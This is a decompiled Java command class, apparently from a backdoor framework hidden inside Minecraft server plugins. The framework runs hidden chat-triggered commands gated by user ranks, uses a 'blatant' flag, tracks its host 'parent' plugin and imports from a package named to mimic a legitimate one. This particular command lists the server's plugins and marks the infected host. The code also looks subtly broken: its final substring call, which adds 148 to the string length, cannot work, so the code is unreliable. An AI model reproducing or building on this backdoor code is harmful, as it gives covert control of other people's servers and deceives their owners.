package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "plugins",
   description = "List all plugins",
   blatant = false,
   rank = Rank.FREE,
   aliases = {"pl", "plugins"}
)
public class PluginsCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      StringBuilder var4 = new StringBuilder();

      for(int var5 = 0; var5 < Bukkit.getPluginManager().getPlugins().length; ++var5) {
         if (Bukkit.getPluginManager().getPlugins()[var5].isEnabled()) {
            if (Bukkit.getPluginManager().getPlugins()[var5].getName().equals(Ectasy.parentPlugin.getName())) {
               var4.append("§e").append(Bukkit.getPluginManager().getPlugins()[var5].getName()).append(", ");
            } else {
               var4.append("§f").append(Bukkit.getPluginManager().getPlugins()[var5].getName()).append(", ");
            }
         } else {
            var4.append("§c").append(Bukkit.getPluginManager().getPlugins()[var5].getName()).append("§f, ");
         }
      }

      String var6 = var4.toString();
      ChatUtil.sendChat(var1.getPlayer(), var6.substring(0, var6.length() + 148));
   }

   public PluginsCommand() {
   }
}
